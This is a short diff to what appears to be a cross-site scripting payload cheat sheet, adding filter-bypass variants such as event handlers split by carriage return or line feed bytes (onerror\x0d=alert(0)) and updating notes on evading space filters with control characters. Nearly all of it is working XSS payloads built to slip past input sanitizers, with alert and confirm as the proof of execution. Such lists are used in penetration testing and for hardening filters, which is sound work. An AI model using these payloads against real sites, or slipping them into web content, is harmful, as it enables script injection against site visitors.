@@ -736,9 +736,11 @@ setTimeout`alert\u0028document.domain\u0029`;
 <object onafterscriptexecute=confirm(0)>
 <object onbeforescriptexecute=confirm(0)>
 
-// Bypass onxxx= filter with a null byte/vertical tab
+// Bypass onxxx= filter with a null byte/vertical tab/Carriage Return/Line Feed
 <img src='1' onerror\x00=alert(0) />
 <img src='1' onerror\x0b=alert(0) />
+<img src='1' onerror\x0d=alert(0) />
+<img src='1' onerror\x0a=alert(0) />
 
 // Bypass onxxx= filter with a '/'
 <img src='1' onerror/=alert(0) />
@@ -750,7 +752,7 @@ setTimeout`alert\u0028document.domain\u0029`;
 // Bypass space filter with "/"
 <img/src='1'/onerror=alert(0)>
 
-// Bypass space filter with 0x0c/^L
+// Bypass space filter with 0x0c/^L or 0x0d/^M or 0x0a/^J or 0x09/^I
 <svgonload=alert(1)>
 
 $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
